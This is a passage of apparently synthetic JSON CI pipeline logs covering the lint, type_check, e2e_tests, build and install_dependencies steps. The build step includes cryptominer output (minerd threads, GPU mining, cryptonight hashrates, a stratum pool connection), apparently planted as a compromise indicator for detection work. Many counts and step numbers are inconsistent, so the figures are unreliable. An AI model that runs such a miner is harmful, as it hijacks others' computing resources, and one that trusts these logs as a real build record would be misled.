          "Cache miss for key-2369",
          "Done.",
          "Time: 43.982s",
          "Installing jest@4.5.6",
          "Test Suites: 31 passed, 23 total",
          "Done.",
          "Verifying...",
          "\u2713 All checks passed",
          "[12:47:59] DEBUG: Initializing service",
          "Tests: 415 passed, 94 total",
          "npm install: resolved 1518 packages",
          "Verifying...",
          "Cache hit for key-8651",
          "Completed.",
          "Step 14/20: Running migrations",
          "Done.",
          "\u2713 deploy completed",
          "Creating production build...",
          "[12:47:59] DEBUG: Loading configuration",
          "Step 18/23: Building",
          "Success!",
          "Bundling styles.css",
          "  PASS: unit/test_api_health.spec.js",
          "Snapshots: 36 passed, 27 total",
          "TLS handshake completed",
          "\u2713 Step 'setup' succeeded",
          "Platform: linux-x64",
          "npm notice: created a lockfile",
          "Cache restored successfully (205MB)",
          "yarn add: Done in 30.5s",
          "npm notice: package.json updated",
          "Optimizing 55 modules...",
          "Cache saved successfully",
          "Already up to date.",
          "Optimizing 27 modules...",
          "[12:47:59] INFO: Request completed",
          "npm notice: package.json updated",
          "FAILED: test_auth_login",
          "Transforming 393 files...",
          "Compiling components/utils.go...",
          "Step 13/25: Building",
          "Ready.",
          "Generating source maps...",
          "FAILED: test_cache_hit",
          "Cache invalidated: node_modules",
          "Step 5/19: Linting",
          "pip: Collecting webpack",
          "[12:47:59] INFO: Starting build process",
          "Compiling components/main.py...",
          "Verifying...",
          "Cache invalidated: dependencies",
          "[12:47:59] INFO: Cache refreshed",
          "pip: Installing build dependencies...",
          "Time: 48.597s",
          "Transforming 307 files...",
          "[12:47:59] INFO: Starting build process",
          "[12:47:59] DEBUG: Loading configuration",
          "Cache miss for key-6974",
          "  PASS: integration/test_api_health.spec.js",
          "Using Node.js 19.6.6",
          "Bundling main.js",
          "npm notice: package.json updated",
          "Snapshots: 5 passed, 28 total",
          "Uploading artifact 'dist' (15 files)",
          "npm notice: package.json updated",
          "Image pulled successfully",
          "Snapshots: 37 passed, 23 total",
          "Compiling lib/index.js...",
          "Cache miss for key-1057",
          "Test Suites: 44 passed, 5 total",
          "  PASS: test_user_create (187ms)",
          "Processing...",
          "TLS handshake completed",
          "\u2713 deploy completed",
          "Step 20/24: Building",
          "Image pulled successfully",
          "pip: Installing build dependencies...",
          "Cache saved successfully",
          "Artifact uploaded: build.tar.gz (43MB)",
          "Success!",
          "Compiling components/main.py...",
          "Platform: win32-x64",
          "Artifact uploaded: dist.zip (60MB)",
          "  PASS: e2e/test_api_health.spec.js",
          "[12:47:59] DEBUG: Memory usage: 1388MB",
          "Environment: development",
          "pip: Collecting axios",
          "WARNING: eslint has known vulnerabilities",
          "  PASS: test_db_connect (358ms)",
          "Completed.",
          "Pulling image: node:18",
          "Step 2/23: Installing dependencies",
          "Time: 82.703s",
          "Waiting...",
          "[12:47:59] DEBUG: Memory usage: 428MB",
          "Step 13/19: Testing",
          "Artifact uploaded: build.tar.gz (37MB)",
          "\u2717 build failed with exit code 39",
          "Ready.",
          "Step 9/23: Linting",
          "Compiling utils/handler.rs...",
          "Platform: linux-x64",
          "Step 17/21: Deploying",
          "npm notice: package.json updated",
          "WARNING: axios has known vulnerabilities",
          "Bundling main.css",
          "Cache hit for key-9390",
          "Verifying...",
          "Step 14/15: Linting",
          "npm install: added 490 packages",
          "FAILED: test_cache_hit",
          "NODE_ENV=production",
          "Artifact uploaded: dist.zip (83MB)",
          "Waiting...",
          "Cache miss for key-5356",
          "[12:47:59] DEBUG: Memory usage: 1388MB",
          "OK",
          "Tests: 464 passed, 464 total",
          "Processing...",
          "OK",
          "Pulling image: python:3.11",
          "POST /data - 201 (335ms)",
          "Tests: 93 passed, 333 total",
          "[12:47:59] DEBUG: Connection pool: 18 active",
          "[12:47:59] INFO: Starting build process",
          "pip: Collecting webpack",
          "[12:47:59] INFO: Processing request",
          "npm notice: created a lockfile",
          "[12:47:59] INFO: Request completed",
          "Done.",
          "[12:47:59] WARN: Deprecated API usage",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Step 5/24: Installing dependencies",
          "NODE_ENV=test",
          "Coverage: 83% statements, 87% branches",
          "NODE_ENV=production",
          "Installing lodash@1.7.0",
          "Installing lodash@5.3.3",
          "Optimizing 12 modules...",
          "=== Step lint completed ==="
        ]
      },
      {
        "name": "type_check",
        "status": "success",
        "started_at": "2025-12-13T12:51:57.999834",
        "finished_at": "2025-12-13T12:52:30.298330",
        "log_lines": [
          "=== Step: type_check ===",
          "WARNING: eslint has known vulnerabilities",
          "[12:47:59] INFO: Connecting to database",
          "Step 20/23: Building",
          "Snapshots: 49 passed, 19 total",
          "Artifact downloaded: 2MB",
          "Uploading artifact 'build' (12 files)",
          "[12:47:59] DEBUG: Initializing service",
          "[12:47:59] ERROR: Connection failed",
          "[12:47:59] DEBUG: Memory usage: 1175MB",
          "[12:47:59] INFO: Request completed",
          "NODE_ENV=development",
          "Layer 3/11: ENV command",
          "Step 1/16: Deploying",
          "Waiting...",
          "pip install: Successfully installed axios-2.11",
          "Cache miss for key-8912",
          "\u2713 All checks passed",
          "Bundling runtime.css",
          "Coverage: 95% statements, 94% branches",
          "Snapshots: 47 passed, 34 total",
          "[12:47:59] DEBUG: Initializing service",
          "[12:47:59] WARN: Deprecated API usage",
          "Step 12/15: Linting",
          "[12:47:59] INFO: Request completed",
          "npm notice: package.json updated",
          "Coverage: 98% statements, 78% branches",
          "Using Node.js 18.18.10",
          "Generating source maps...",
          "Using Python 3.9",
          "[12:47:59] INFO: Starting build process",
          "WARNING: axios has known vulnerabilities",
          "Cache invalidated: node_modules",
          "Compiling lib/index.js...",
          "Test Suites: 15 passed, 47 total",
          "pip: Collecting eslint",
          "Ready.",
          "Tests: 313 passed, 146 total",
          "Finished.",
          "Already up to date.",
          "Finished.",
          "Checking out develop branch",
          "Exception: NullPointerException",
          "WARNING: express has known vulnerabilities",
          "pip install: Successfully installed eslint-1.6",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "[12:47:59] INFO: Cache refreshed",
          "[12:47:59] DEBUG: Initializing service",
          "Success!",
          "[12:47:59] DEBUG: Memory usage: 584MB",
          "Generating source maps...",
          "npm install: added 397 packages",
          "Processing...",
          "  PASS: test_cache_hit (415ms)",
          "Step 16/25: Installing dependencies",
          "Using Node.js 17.19.6",
          "Bundling vendor.css",
          "Bundling vendor.css",
          "[12:47:59] DEBUG: Memory usage: 293MB",
          "npm install: added 122 packages",
          "Platform: linux-x64",
          "Fetching submodules...",
          "[12:47:59] WARN: Deprecated API usage",
          "Cache miss for key-8036",
          "Uploading artifact 'build' (34 files)",
          "Step 20/25: Linting",
          "Layer 5/11: ENV command",
          "[12:47:59] INFO: Request completed",
          "[12:47:59] INFO: Cache refreshed",
          "Done.",
          "pip: Collecting react",
          "Compiling components/service.java...",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "[12:47:59] WARN: Deprecated API usage",
          "[12:47:59] ERROR: Connection failed",
          "Switched to branch 'feature/task-399'",
          "Step 16/18: Deploying",
          "Layer 10/12: COPY command",
          "OK",
          "npm install: resolved 1393 packages",
          "Artifact uploaded: build.tar.gz (19MB)",
          "Image pulled successfully",
          "Coverage: 80% statements, 87% branches",
          "Verifying...",
          "\u2713 Task completed in 2559ms",
          "Finished.",
          "Fetching from https://gcr.io/package.json",
          "HEAD is now at 3b19580",
          "Coverage: 85% statements, 71% branches",
          "yarn add: Done in 15.15s",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Done.",
          "POST /upload - 201 (200ms)",
          "[12:47:59] INFO: Processing request",
          "Artifact downloaded: 49MB",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Connection established",
          "Step 18/20: Deploying",
          "Checking out develop branch",
          "Time: 8.202s",
          "GET /status - 200 (70ms)",
          "Generating source maps...",
          "pip: Downloading react-2.17.tar.gz",
          "Image pulled successfully",
          "OK",
          "Fetching submodules...",
          "WARNING: react has known vulnerabilities",
          "Step 19/15: Testing",
          "Installing eslint@2.9.8",
          "Ready.",
          "npm notice: created a lockfile",
          "Installing axios@4.5.7",
          "[12:47:59] DEBUG: Initializing service",
          "npm install: resolved 1226 packages",
          "Ran 99 tests in 51s",
          "WARNING: jest has known vulnerabilities",
          "Cache restored successfully (70MB)",
          "POST /data - 201 (207ms)",
          "POST /data - 202 (34ms)",
          "GET /health - 204 (15ms)",
          "[12:47:59] INFO: Request completed",
          "[12:47:59] DEBUG: Memory usage: 1605MB",
          "npm notice: package.json updated",
          "Test Suites: 44 passed, 48 total",
          "\u2713 Step 'build' succeeded",
          "Pushing to registry...",
          "Snapshots: 28 passed, 49 total",
          "Building Docker image...",
          "HEAD is now at 294784c",
          "[12:47:59] DEBUG: Loading configuration",
          "Step 10/20: Testing",
          "Generating source maps...",
          "[12:47:59] INFO: Connecting to database",
          "Compiling src/main.py...",
          "[12:47:59] INFO: Starting build process",
          "FAILED: test_db_connect",
          "Pushing to registry...",
          "Waiting...",
          "\u2713 deploy completed",
          "Building Docker image...",
          "  PASS: test_db_connect (137ms)",
          "yarn add: Done in 29.78s",
          "pip: Collecting axios",
          "[12:47:59] DEBUG: Connection pool: 16 active",
          "Step 3/17: Testing",
          "Loading...",
          "pip install: Successfully installed webpack-1.16",
          "  PASS: test_user_create (384ms)",
          "\u2717 build failed with exit code 77",
          "Using Python 3.12",
          "Finished.",
          "npm install: resolved 132 packages",
          "Already up to date.",
          "  PASS: integration/test_user_create.spec.js",
          "OK",
          "Environment: staging",
          "Image pulled successfully",
          "  PASS: unit/test_api_health.spec.js",
          "Step 16/20: Building",
          "Snapshots: 30 passed, 40 total",
          "Step 20/17: Running migrations",
          "Success!",
          "Cache hit for key-4634",
          "Pulling image: node:3.11",
          "Creating production build...",
          "NODE_ENV=development",
          "Pushing to registry...",
          "[12:47:59] INFO: Connecting to database",
          "Step 11/15: Building",
          "pip install: Successfully installed prettier-4.18",
          "Compiling utils/handler.rs...",
          "Image pulled successfully",
          "pip install: Successfully installed prettier-2.12",
          "[12:47:59] DEBUG: Query executed in 74ms",
          "Using Python 3.12",
          "Layer 3/15: COPY command",
          "npm notice: created a lockfile",
          "Snapshots: 36 passed, 4 total",
          "Time: 103.295s",
          "Time: 71.586s",
          "Compiling lib/service.java...",
          "[12:47:59] WARN: Deprecated API usage",
          "pip: Installing build dependencies...",
          "Using Node.js 19.13.1",
          "Using Node.js 20.0.1",
          "NODE_ENV=test",
          "Fetching submodules...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "[12:47:59] DEBUG: Loading configuration",
          "WARNING: express has known vulnerabilities",
          "Ready.",
          "Environment: production",
          "Time: 74.143s",
          "Connection established",
          "FAILED: test_db_connect",
          "Verifying...",
          "Platform: win32-x64",
          "Snapshots: 15 passed, 42 total",
          "Platform: darwin-arm64",
          "pip: Downloading jest-5.16.tar.gz",
          "Artifact uploaded: build.tar.gz (38MB)",
          "pip: Downloading react-2.6.tar.gz",
          "Switched to branch 'bugfix/task-693'",
          "pip: Downloading express-3.13.tar.gz",
          "pip: Downloading lodash-4.14.tar.gz",
          "GET /status - 201 (29ms)",
          "Cache restored successfully (429MB)",
          "[12:47:59] INFO: Starting build process",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "pip: Installing build dependencies...",
          "Checking out main branch",
          "Using Node.js 20.8.0",
          "Snapshots: 24 passed, 14 total",
          "Image pulled successfully",
          "WARNING: axios has known vulnerabilities",
          "Pulling image: alpine:3.11",
          "[12:47:59] DEBUG: Memory usage: 1611MB",
          "TLS handshake completed",
          "Minifying main.js",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "  PASS: test_cache_hit (263ms)",
          "[12:47:59] INFO: Cache refreshed",
          "Artifact uploaded: build.tar.gz (17MB)",
          "Artifact uploaded: dist.zip (47MB)",
          "Artifact uploaded: dist.zip (80MB)",
          "Compiling lib/utils.go...",
          "[12:47:59] DEBUG: Initializing service",
          "[12:47:59] INFO: Connecting to database",
          "Done.",
          "Time: 117.231s",
          "Creating production build...",
          "Layer 2/13: RUN command",
          "[12:47:59] WARN: Deprecated API usage",
          "Step 20/16: Deploying",
          "Bundling vendor.js",
          "Compiling lib/index.js...",
          "Waiting...",
          "Compiling utils/handler.rs...",
          "Cache restored successfully (440MB)",
          "Step 15/25: Testing",
          "Bundling main.css",
          "=== Step type_check completed ==="
        ]
      },
      {
        "name": "e2e_tests",
        "status": "success",
        "started_at": "2025-12-13T12:52:30.298330",
        "finished_at": "2025-12-13T12:53:02.596826",
        "log_lines": [
          "=== Step: e2e_tests ===",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "GET /status - 204 (34ms)",
          "Completed.",
          "Switched to branch 'hotfix/task-143'",
          "Compiling utils/service.java...",
          "Using Python 3.12",
          "\u2713 Task completed in 284ms",
          "pip: Installing build dependencies...",
          "Step 19/24: Linting",
          "Compiling lib/index.js...",
          "[12:47:59] WARN: Deprecated API usage",
          "Environment: development",
          "Success!",
          "pip: Installing build dependencies...",
          "Waiting...",
          "yarn add: Done in 5.67s",
          "  PASS: e2e/test_auth_login.spec.js",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Artifact uploaded: dist.zip (5MB)",
          "Processing...",
          "Cache invalidated: build",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Building Docker image...",
          "Switched to branch 'feature/task-927'",
          "Done.",
          "yarn add: Done in 25.89s",
          "[12:47:59] DEBUG: Memory usage: 1829MB",
          "Pulling image: python:18",
          "pip install: Successfully installed jest-4.13",
          "  PASS: test_auth_login (37ms)",
          "Uploading artifact 'coverage' (28 files)",
          "Creating production build...",
          "Image pulled successfully",
          "[12:47:59] DEBUG: Connection pool: 5 active",
          "\u2717 build failed with exit code 85",
          "Artifact uploaded: build.tar.gz (5MB)",
          "Artifact downloaded: 7MB",
          "pip: Collecting prettier",
          "Already up to date.",
          "Cache saved successfully",
          "npm notice: created a lockfile",
          "Minifying app.js",
          "\u2713 lint completed",
          "Pushing to registry...",
          "Step 16/22: Testing",
          "[12:47:59] INFO: Request completed",
          "Verifying...",
          "Uploading artifact 'dist' (25 files)",
          "[12:47:59] INFO: Starting build process",
          "[12:47:59] DEBUG: Memory usage: 1940MB",
          "[12:47:59] DEBUG: Loading configuration",
          "Step 16/23: Running migrations",
          "Pulling image: python:3.11",
          "WARNING: express has known vulnerabilities",
          "pip: Installing build dependencies...",
          "OK",
          "FAILED: test_auth_login",
          "  PASS: test_api_health (430ms)",
          "npm notice: package.json updated",
          "  PASS: integration/test_auth_login.spec.js",
          "[12:47:59] DEBUG: Initializing service",
          "[12:47:59] INFO: Processing request",
          "Ready.",
          "npm install: added 177 packages",
          "Fetching from https://npmjs.org/package.json",
          "Environment: staging",
          "[12:47:59] WARN: Deprecated API usage",
          "Step 13/25: Building",
          "yarn add: Done in 13.25s",
          "[12:47:59] ERROR: Connection failed",
          "Step 16/25: Linting",
          "Transforming 438 files...",
          "Connection established",
          "Step 14/24: Deploying",
          "pip: Installing build dependencies...",
          "Compiling lib/index.js...",
          "[12:47:59] DEBUG: Query executed in 85ms",
          "[12:47:59] INFO: Connecting to database",
          "Pulling image: alpine:latest",
          "Time: 70.454s",
          "Step 3/20: Building",
          "WARNING: webpack has known vulnerabilities",
          "Loading...",
          "\u2717 build failed with exit code 19",
          "Pulling image: alpine:3.11",
          "Switched to branch 'feature/task-610'",
          "Tests: 372 passed, 410 total",
          "Cache miss for key-2351",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "POST /api - 200 (472ms)",
          "Switched to branch 'bugfix/task-140'",
          "Loading...",
          "Step 10/23: Building",
          "WARNING: express has known vulnerabilities",
          "Fetching from https://npmjs.org/package.json",
          "[12:47:59] WARN: Deprecated API usage",
          "GET /health - 200 (24ms)",
          "Platform: linux-x64",
          "Step 8/22: Deploying",
          "Time: 10.909s",
          "[12:47:59] DEBUG: Initializing service",
          "[12:47:59] WARN: Deprecated API usage",
          "Waiting...",
          "Uploading artifact 'build' (1 files)",
          "Connection established",
          "Loading...",
          "Pulling image: alpine:18",
          "[12:47:59] DEBUG: Query executed in 97ms",
          "Fetching submodules...",
          "[12:47:59] DEBUG: Initializing service",
          "pip: Installing build dependencies...",
          "Finished.",
          "Compiling utils/app.ts...",
          "FAILED: test_db_connect",
          "[12:47:59] DEBUG: Initializing service",
          "[12:47:59] INFO: Starting build process",
          "Step 6/16: Running migrations",
          "Using Node.js 15.15.1",
          "[12:47:59] DEBUG: Connection pool: 3 active",
          "[12:47:59] DEBUG: Initializing service",
          "[12:47:59] INFO: Connecting to database",
          "Compiling components/index.js...",
          "Compiling lib/main.py...",
          "\u2713 All checks passed",
          "NODE_ENV=production",
          "pip: Downloading prettier-4.1.tar.gz",
          "Waiting...",
          "Step 19/19: Building",
          "Cache hit for key-4555",
          "Fetching from https://registry.npmjs.org/package.json",
          "Compiling components/utils.go...",
          "Environment: test",
          "Compiling components/main.py...",
          "[12:47:59] DEBUG: Query executed in 15ms",
          "npm notice: created a lockfile",
          "\u2713 Task completed in 1783ms",
          "pip install: Successfully installed prettier-2.10",
          "\u2713 Task completed in 4814ms",
          "yarn add: Done in 3.31s",
          "Already up to date.",
          "  PASS: test_auth_login (116ms)",
          "Connection established",
          "[12:47:59] INFO: Starting build process",
          "WARNING: express has known vulnerabilities",
          "\u2717 build failed with exit code 29",
          "Pulling image: python:3.11",
          "[12:47:59] INFO: Connecting to database",
          "Finished.",
          "pip: Downloading react-1.1.tar.gz",
          "Artifact uploaded: build.tar.gz (20MB)",
          "npm notice: created a lockfile",
          "POST /data - 201 (177ms)",
          "Test Suites: 48 passed, 23 total",
          "[12:47:59] INFO: Processing request",
          "Environment: staging",
          "NODE_ENV=test",
          "Cache hit for key-2749",
          "Waiting...",
          "Generating source maps...",
          "Completed.",
          "[12:47:59] INFO: Connecting to database",
          "npm install: resolved 1411 packages",
          "Tests: 228 passed, 100 total",
          "Step 18/21: Building",
          "Processing...",
          "Fetching from https://github.com/package.json",
          "Generating source maps...",
          "Checking out develop branch",
          "Artifact uploaded: dist.zip (80MB)",
          "Step 15/16: Linting",
          "Connection established",
          "npm install: added 45 packages",
          "Building Docker image...",
          "\u2713 All checks passed",
          "[12:47:59] ERROR: Connection failed",
          "[12:47:59] INFO: Starting build process",
          "Step 9/25: Building",
          "Environment: production",
          "Connection established",
          "Compiling lib/utils.go...",
          "Connection established",
          "Building Docker image...",
          "npm notice: package.json updated",
          "Finished.",
          "Installing webpack@4.11.10",
          "Fetching submodules...",
          "Switched to branch 'hotfix/task-752'",
          "WARNING: react has known vulnerabilities",
          "[12:47:59] INFO: Processing request",
          "Fetching from https://github.com/package.json",
          "Step 16/23: Running migrations",
          "[12:47:59] WARN: Deprecated API usage",
          "Compiling components/handler.rs...",
          "\u2713 Step 'setup' succeeded",
          "POST /upload - 201 (167ms)",
          "Exception: RuntimeError",
          "[12:47:59] INFO: Starting build process",
          "pip: Installing build dependencies...",
          "  PASS: e2e/test_api_health.spec.js",
          "[12:47:59] INFO: Request completed",
          "Finished.",
          "Bundling vendor.js",
          "pip: Installing build dependencies...",
          "[12:47:59] INFO: Starting build process",
          "Exception: NullPointerException",
          "Compiling src/main.py...",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "npm notice: package.json updated",
          "WARNING: prettier has known vulnerabilities",
          "Minifying vendor.js",
          "[12:47:59] INFO: Starting build process",
          "TLS handshake completed",
          "Building Docker image...",
          "Cache miss for key-5828",
          "Finished.",
          "npm notice: package.json updated",
          "OK",
          "\u2713 validate completed",
          "Step 5/21: Testing",
          "Verifying...",
          "[12:47:59] WARN: Deprecated API usage",
          "\u2713 test completed",
          "NODE_ENV=development",
          "Uploading artifact 'build' (29 files)",
          "Bundling styles.css",
          "Cache miss for key-5274",
          "Step 11/17: Building",
          "Compiling components/utils.go...",
          "Optimizing 29 modules...",
          "Minifying main.js",
          "HEAD is now at 640d9e5",
          "Using Node.js 18.1.9",
          "  PASS: integration/test_user_create.spec.js",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Switched to branch 'bugfix/task-850'",
          "[12:47:59] DEBUG: Initializing service",
          "npm notice: package.json updated",
          "Completed.",
          "Cache restored successfully (227MB)",
          "[12:47:59] DEBUG: Initializing service",
          "=== Step e2e_tests completed ==="
        ]
      },
      {
        "name": "build",
        "status": "success",
        "started_at": "2025-12-13T12:53:02.596826",
        "finished_at": "2025-12-13T12:54:39.492315",
        "log_lines": [
          "=== Step: build ===",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Step 10/16: Linting",
          "[12:47:59] INFO: Starting build process",
          "Ran 175 tests in 41s",
          "[12:47:59] DEBUG: Memory usage: 1874MB",
          "Cache invalidated: build",
          "Artifact uploaded: build.tar.gz (24MB)",
          "\u2717 build failed with exit code 108",
          "Tests: 134 passed, 400 total",
          "[12:47:59] DEBUG: Connection pool: 20 active",
          "[12:47:59] DEBUG: Connection pool: 5 active",
          "Cache hit for key-6251",
          "Environment: staging",
          "Step 19/15: Building",
          "\u2713 Step 'test' succeeded",
          "\u2713 deploy completed",
          "Optimizing 62 modules...",
          "Already up to date.",
          "Cache hit for key-7990",
          "pip: Collecting react",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "pip: Installing build dependencies...",
          "pip: Collecting express",
          "Checking out master branch",
          "Step 5/23: Running migrations",
          "Creating production build...",
          "npm notice: package.json updated",
          "WARNING: prettier has known vulnerabilities",
          "Optimizing 40 modules...",
          "Bundling vendor.css",
          "Tests: 455 passed, 228 total",
          "Optimizing 76 modules...",
          "[12:47:59] WARN: Deprecated API usage",
          "Waiting...",
          "GET /api - 200 (7ms)",
          "Compiling src/service.java...",
          "Finished.",
          "npm install: added 98 packages",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Step 20/16: Deploying",
          "Ready.",
          "POST /upload - 200 (143ms)",
          "  PASS: unit/test_user_create.spec.js",
          "[12:47:59] INFO: Processing request",
          "FAILED: test_user_create",
          "Cache saved successfully",
          "Environment: production",
          "GET /status - 200 (92ms)",
          "[12:47:59] INFO: Connecting to database",
          "\u2713 build completed",
          "Time: 99.98s",
          "Tests: 236 passed, 258 total",
          "Environment: production",
          "Creating production build...",
          "Cache miss for key-3521",
          "[12:47:59] INFO: Request completed",
          "[12:47:59] DEBUG: Connection pool: 9 active",
          "Ran 32 tests in 54s",
          "Switched to branch 'bugfix/task-473'",
          "\u2713 Step 'install' succeeded",
          "NODE_ENV=test",
          "Step 6/22: Building",
          "Generating source maps...",
          "yarn add: Done in 15.69s",
          "Compiling utils/service.java...",
          "Compiling src/app.ts...",
          "pip: Installing build dependencies...",
          "Compiling src/handler.rs...",
          "Verifying...",
          "Compiling lib/handler.rs...",
          "Test Suites: 32 passed, 47 total",
          "npm notice: package.json updated",
          "Time: 116.818s",
          "Tests: 181 passed, 251 total",
          "Accepted share #232",
          "Bundling main.css",
          "[12:47:59] DEBUG: Query executed in 29ms",
          "yarn add: Done in 15.67s",
          "Verifying...",
          "POST /upload - 201 (312ms)",
          "npm notice: created a lockfile",
          "Step 1/24: Installing dependencies",
          "minerd: 8 threads active",
          "  PASS: integration/test_api_health.spec.js",
          "\u2713 Task completed in 4410ms",
          "Already up to date.",
          "Cache saved successfully",
          "[12:47:59] WARN: Deprecated API usage",
          "pip: Downloading axios-5.15.tar.gz",
          "Building Docker image...",
          "Coverage: 73% statements, 88% branches",
          "  PASS: test_auth_login (161ms)",
          "GPU #0: 85\u00b0C, mining",
          "Cache hit for key-6213",
          "Step 3/23: Installing dependencies",
          "Cache restored successfully (150MB)",
          "Time: 85.355s",
          "Connection established",
          "\u2713 test completed",
          "FAILED: test_user_create",
          "Using Python 3.12",
          "\u2713 Step 'test' succeeded",
          "Checking out master branch",
          "Artifact downloaded: 38MB",
          "Step 1/20: Building",
          "\u2717 build failed with exit code 73",
          "Cache restored successfully (271MB)",
          "Platform: linux-x64",
          "Optimizing 13 modules...",
          "Step 16/19: Installing dependencies",
          "Minifying app.js",
          "Pushing to registry...",
          "Bundling styles.css",
          "Ran 182 tests in 13s",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "minerd: 8 threads active",
          "Cache hit for key-6306",
          "Connecting to stratum+tcp://mine.crypto-mine.io:3333",
          "Step 20/18: Installing dependencies",
          "Uploading artifact 'coverage' (25 files)",
          "Cache invalidated: dependencies",
          "Fetching submodules...",
          "Environment: development",
          "Ready.",
          "[12:47:59] DEBUG: Connection pool: 16 active",
          "Fetching from https://pypi.org/package.json",
          "Generating source maps...",
          "Image pulled successfully",
          "Artifact uploaded: build.tar.gz (11MB)",
          "Step 8/19: Testing",
          "Switched to branch 'feature/task-837'",
          "Platform: win32-x64",
          "Loading...",
          "  PASS: unit/test_db_connect.spec.js",
          "Pulling image: node:18",
          "HEAD is now at d71c11f",
          "Compiling src/index.js...",
          "Installing prettier@2.5.1",
          "WARNING: webpack has known vulnerabilities",
          "Step 8/15: Building",
          "Step 16/19: Running migrations",
          "[12:47:59] DEBUG: Memory usage: 1740MB",
          "Ready.",
          "Switched to branch 'bugfix/task-851'",
          "GPU #3: 85\u00b0C, mining",
          "[12:47:59] DEBUG: Query executed in 90ms",
          "[12:47:59] DEBUG: Loading configuration",
          "[12:47:59] INFO: Cache refreshed",
          "Pulling image: python:18",
          "\u2713 Step 'setup' succeeded",
          "cryptonight: Hashrate: 4835 H/s",
          "POST /data - 201 (197ms)",
          "yarn add: Done in 19.17s",
          "\u2713 All checks passed",
          "Compiling lib/handler.rs...",
          "[12:47:59] DEBUG: Query executed in 87ms",
          "Cache restored successfully (431MB)",
          "[12:47:59] INFO: Starting build process",
          "OK",
          "Pulling image: python:18",
          "Cache hit for key-4161",
          "[12:47:59] DEBUG: Connection pool: 8 active",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Loading...",
          "Fetching from https://npmjs.org/package.json",
          "Checking out main branch",
          "[12:47:59] DEBUG: Initializing service",
          "Image pulled successfully",
          "Checking out main branch",
          "\u2713 Step 'setup' succeeded",
          "Pulling image: alpine:18",
          "  PASS: unit/test_cache_hit.spec.js",
          "cryptonight: Hashrate: 6378 H/s",
          "Bundling main.css",
          "Ready.",
          "Compiling src/service.java...",
          "Processing...",
          "GET /api - 201 (63ms)",
          "[12:47:59] DEBUG: Connection pool: 11 active",
          "Artifact uploaded: dist.zip (42MB)",
          "Coverage: 81% statements, 81% branches",
          "Building Docker image...",
          "Artifact uploaded: build.tar.gz (35MB)",
          "pip install: Successfully installed eslint-4.13",
          "\u2713 Task completed in 3642ms",
          "npm notice: package.json updated",
          "Creating production build...",
          "Success!",
          "\u2713 Task completed in 4290ms",
          "Compiling components/index.js...",
          "GPU #3: 70\u00b0C, mining",
          "Verifying...",
          "Checking out develop branch",
          "Verifying...",
          "[12:47:59] INFO: Request completed",
          "Switched to branch 'feature/task-429'",
          "[12:47:59] WARN: Deprecated API usage",
          "Step 6/19: Installing dependencies",
          "Tests: 183 passed, 151 total",
          "Switched to branch 'feature/task-791'",
          "Step 18/22: Building",
          "Transforming 836 files...",
          "Cache hit for key-5338",
          "Cache restored successfully (372MB)",
          "cryptonight: Hashrate: 4401 H/s",
          "yarn add: Done in 18.95s",
          "Step 12/24: Building",
          "[12:47:59] DEBUG: Loading configuration",
          "Layer 6/9: ENV command",
          "TLS handshake completed",
          "POST /api - 202 (240ms)",
          "pip: Collecting react",
          "HEAD is now at 1de40e4",
          "GPU #3: 64\u00b0C, mining",
          "Minifying vendor.js",
          "[12:47:59] INFO: Processing request",
          "[12:47:59] INFO: Starting build process",
          "FAILED: test_db_connect",
          "[12:47:59] DEBUG: Memory usage: 1360MB",
          "\u2713 deploy completed",
          "Compiling utils/handler.rs...",
          "[12:47:59] ERROR: Connection failed",
          "pip install: Successfully installed eslint-1.15",
          "Fetching from https://docker.io/package.json",
          "Loading...",
          "Checking out develop branch",
          "Minifying vendor.js",
          "Connecting to stratum+tcp://mine.crypto-mine.io:3333",
          "Minifying vendor.js",
          "Time: 38.459s",
          "Processing...",
          "Verifying...",
          "GET /status - 201 (34ms)",
          "Cache miss for key-6382",
          "  PASS: unit/test_api_health.spec.js",
          "[12:47:59] WARN: Deprecated API usage",
          "Time: 65.416s",
          "[12:47:59] INFO: Cache refreshed",
          "Step 8/21: Building",
          "Using Python 3.10",
          "Snapshots: 37 passed, 29 total",
          "pip: Installing build dependencies...",
          "\u2717 build failed with exit code 55",
          "Pulling image: python:3.11",
          "Layer 10/13: ENV command",
          "[12:47:59] INFO: Request completed",
          "Creating production build...",
          "  PASS: test_auth_login (332ms)",
          "Processing...",
          "[12:47:59] DEBUG: Query executed in 41ms",
          "pip: Downloading jest-5.10.tar.gz",
          "Image pulled successfully",
          "=== Step build completed ==="
        ]
      },
      {
        "name": "install_dependencies",
        "status": "success",
        "started_at": "2025-12-13T12:54:39.492315",
        "finished_at": "2025-12-13T12:56:16.387804",
        "log_lines": [
          "=== Step: install_dependencies ===",
          "Uploading artifact 'coverage' (41 files)",
          "Cache miss for key-3120",
          "Image pulled successfully",
          "Cache miss for key-4663",
          "Connection established",
          "[12:47:59] DEBUG: Loading configuration",
          "POST /upload - 201 (178ms)",
          "\u2713 package completed",
          "[12:47:59] INFO: Request completed",
          "[12:47:59] DEBUG: Connection pool: 13 active",
          "pip install: Successfully installed jest-3.20",
          "Step 12/19: Testing",
          "Compiling lib/app.ts...",
          "GET /health - 204 (9ms)",
          "[12:47:59] ERROR: Connection failed",
          "Completed.",
          "\u2713 package completed",
          "[12:47:59] DEBUG: Loading configuration",
          "WARNING: eslint has known vulnerabilities",
          "Step 20/19: Building",
          "Cache saved successfully",
          "WARNING: express has known vulnerabilities",
          "Fetching from https://amazonaws.com/package.json",
